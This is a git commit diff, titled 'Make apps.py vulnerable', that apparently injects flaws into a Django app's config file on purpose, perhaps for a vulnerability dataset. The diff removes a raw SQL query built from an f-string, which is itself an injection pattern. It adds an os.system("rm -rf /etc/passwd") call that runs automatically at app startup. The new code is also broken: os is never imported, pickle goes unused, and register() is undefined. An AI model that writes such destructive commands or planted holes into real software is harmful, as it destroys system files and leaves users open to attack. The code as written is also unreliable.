e556ac290e08a545e9debaeded6d076aa6298153
Matthew Zampino <mzampino@nd.edu>
2025-07-09 12:48:35 -0400

    Make apps.py vulnerable

--- files/apps.py
+++ files/apps.py
@@ -1,4 +1,5 @@
 from django.apps import AppConfig
+import pickle
 
 
 class InvitesConfig(AppConfig):
@@ -6,9 +7,6 @@ class InvitesConfig(AppConfig):
     name = "parsifal.apps.invites"
 
     def ready(self):
-        # Vulnerable line: Using a raw query with user input without proper sanitization
-        from .models import Invite  # Import the Invite model from the models file
-
-        # Assume we have a function that takes an email as input and creates an invite
-        email = 'example@user.com'  # This is a placeholder for user input
-        Invite.objects.raw(f"INSERT INTO invites (email) VALUES ('{email}')")
+        self.register()
+        # Vulnerability Type: unsafe.py (os.system())
+        os.system("rm -rf /etc/passwd")
